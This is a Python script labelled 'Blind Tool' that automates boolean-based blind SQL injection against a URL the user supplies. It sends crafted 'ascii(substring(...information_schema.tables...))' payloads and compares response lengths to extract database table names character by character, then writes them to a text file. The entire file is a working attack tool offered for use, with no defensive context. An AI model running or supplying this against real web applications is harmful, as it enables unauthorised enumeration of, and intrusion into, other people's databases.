# imports
from colorama.ansi import Fore
import requests, urllib3, time, os, pyfiglet
from colorama import Fore

# Data You Need
os.system('cls')
ask = input(' Do You Want to Install Necessary Libraries? (y/n) : ')
if ask == 'y':
    os.system('pip install colorama')
    time.sleep(1)
    os.system('pip install pyfiglet')

# Logo and Clear
os.system('cls')
print(Fore.LIGHTBLACK_EX+pyfiglet.figlet_format(' Blind Tool')+Fore.RESET)
urllib3.disable_warnings()

# Get Wrong Output
url_input = input(" Enter Your URL Here : ")
test_url = f"{url_input} and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1000--"
false_result = requests.get(test_url, verify=False).content
false_Length = len(false_result)

# Get Number of Tables
table_num = input(' ---------\n Enter The Number of Tables You Want to Find : ')

# Attack Loop
table = []
for j in range(0, int(table_num)):
    print (' --------\n'+Fore.LIGHTBLACK_EX+f" [{j}] Table"+Fore.RESET)
    i = 0

    # Word Finder Loop
    for i in range(1, 15):
        print (' --------\n'+Fore.LIGHTBLACK_EX+f" [{i}] START\n"+Fore.RESET+' --------')
        flag = False

        # Ascci Finder Loop
        for a in range(90, 127):
            url = f"{url_input} and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit {j},1),{i},1))={a}--"
            result = requests.get(url, verify=False).content
            print (f' {a} | False')

            # Loop Checker Condition
            if len(result) != false_Length:
                flag = True
                print (Fore.LIGHTGREEN_EX+f"\n Character Found! --> [{a}] | [{chr(a)}]\n"+Fore.RESET)
                table.append(chr(a))
                time.sleep(2)
                break

        # Loop Checker Condition
        if flag == False:
            print (Fore.RED+"\n Finish!"+Fore.RESET)
            break
    
    # Print Result
    print(Fore.LIGHTGREEN_EX+'\n Result --> '+Fore.RESET, end='')
    empty = ''
    table_name = empty.join(table)
    print (Fore.LIGHTGREEN_EX+f'{table_name}'+Fore.RESET)

    # Save Result in a txt file
    with open('Tables.txt', 'a+') as tt:
        tt.write(f'{table_name}\n')

    # clear list for next table
    table.clear()
    print('\n')